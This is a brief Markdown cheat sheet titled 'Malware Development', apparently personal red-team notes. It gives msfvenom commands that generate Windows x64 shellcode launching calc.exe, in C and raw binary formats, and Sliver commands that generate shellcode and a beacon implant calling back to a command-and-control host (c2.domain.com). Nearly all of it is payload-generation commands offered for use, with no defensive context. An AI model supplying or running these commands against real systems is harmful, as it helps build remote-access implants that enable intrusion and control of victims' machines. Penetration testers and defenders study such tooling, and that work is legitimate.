# Malware Development


## msfvenom

### Generate calc.bin en C


```bash
msfvenom -p windows/x64/exec CMD=calc.exe -f c
```

### calc.bin file

```bash
msfvenom -p windows/x64/exec CMD=calc.exe -f raw > calc.bin
```

## sliver

### Shellcode bin

```bash
generate -f shellcode -m c2.domain.com -l -G
```

### Shellcode exe

```bash
generate beacon -m c2.domain.com -G -l
```